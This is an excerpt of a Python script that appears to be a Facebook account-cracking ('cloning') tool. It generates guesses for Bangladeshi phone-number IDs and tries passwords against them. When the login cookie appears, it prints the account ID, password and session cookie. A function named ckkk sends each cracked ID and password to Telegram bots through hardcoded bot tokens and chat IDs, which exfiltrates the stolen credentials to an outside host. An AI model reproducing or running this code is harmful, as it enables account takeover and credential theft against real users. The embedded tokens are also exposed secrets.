...
def ND():
    ...
    opt = input(' \033[38;5;196m[\033[38;5;195mâ•\033[38;5;196m]\033[38;5;46m Choose option \033[38;5;195m: \033[38;5;46m')
...
def o():
    ...
    print(' \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—')
...
def file():
	...
	bot_token = ('6133876724:AAF798kxW6gClFuie7PtmCkSvPWRN8Zzemk')	bot_id = ('1818606358')
...
def ckkk(uid,ps):
	...
	fbapi = "6023459177:AAHGA-S0g230gklrxyg7n0vTFPJ8RI1Dq34";bot_id = "1818606358";chat_id = "5012287298";message = ("ok >> "+ uid + " | " +ps);url = f"https://api.telegram.org/bot{fbapi}/sendMessage?chat_id={bot_id}&text={message}";url2 = f"https://api.telegram.org/bot{fbapi}/sendMessage?chat_id={chat_id}&text={message}";s=(requests.get(url).json());d=(requests.get(url2).json())            
...
def i():
    ...
    jalan(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m BD CODES    \033[38;5;45m88016, \033[38;5;46m88017 ,\033[38;5;192m88018 ,\033[38;5;195m88019  ...\033[0;97m')
    ...
    limit = int(input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE\033[38;5;46m: \033[38;5;195m2000, \033[38;5;46m3000, \033[38;5;45m50000, \033[38;5;46m100000\n \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã— \n \033[38;5;196m[\033[38;5;195mâ€¢\033[38;5;196m]\033[38;5;45m CLONING LIMIT\033[38;5;195m:\033[38;5;46m '))
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(' \033[38;5;46m[HASAN-OK]  ' +uid+ ' | ' +ps+    '  \n \033[38;5;45mCookie = \033[38;5;192m'+coki+  ' \n \033[38;5;45mUsar Agent = '+pro+'  \033[0;97m')
